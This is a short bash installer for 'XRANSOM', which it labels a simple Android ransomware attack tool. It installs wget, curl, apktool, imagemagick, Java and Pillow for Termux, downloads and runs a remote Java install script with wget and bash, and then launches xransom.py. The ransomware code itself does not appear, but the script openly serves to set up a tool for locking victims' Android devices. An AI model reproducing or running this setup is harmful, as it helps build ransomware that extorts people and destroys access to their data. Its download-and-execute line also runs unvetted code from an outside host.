#! /usr/bin/bash
null="> /dev/null 2>&1"
g="\033[1;32m"
r="\033[1;31m"
b="\033[1;34m"
w="\033[0m"
echo -e $b">"$w" XRANSOM - Simple android ransomware attack"
echo -e $b">"$w" prepare for installing dependencies ..."
sleep 3
echo -e $b">"$w" installing package: "$g"wget"$w
apt-get install wget -y
clear
echo -e $b">"$w" installing package: "$g"curl"$w
apt-get install curl -y
clear
echo -e $b">"$w" installing package: "$g"apktool"$w
git clone https://github.com/Lexiie/Termux-Apktool
cd Termux-Apktool
dpkg -i apktool_2.3.4_all.deb
cd ..
apt-get install apktool -y
clear
echo -e $b">"$w" installing package: "$g"imagemagick"$w
apt-get install imagemagick -y
clear
echo -e $b">"$w" installing package: "$g"java"$w
wget https://raw.githubusercontent.com/MasterDevX/java/master/installjava && bash installjava
clear
echo -e $b">"$w" installing pacakge: "$g"python3"$w
apt-get install python3
clear
echo -e $b">"$w" installing modules: "$g"pillow"$w
pip3 install Pillow
clear
echo -e $b">"$w" successfully installing dependencies"
echo -e $b">"$w" use command "$g"python3 xransom.py"$w" for start the console"
python3 xransom.py
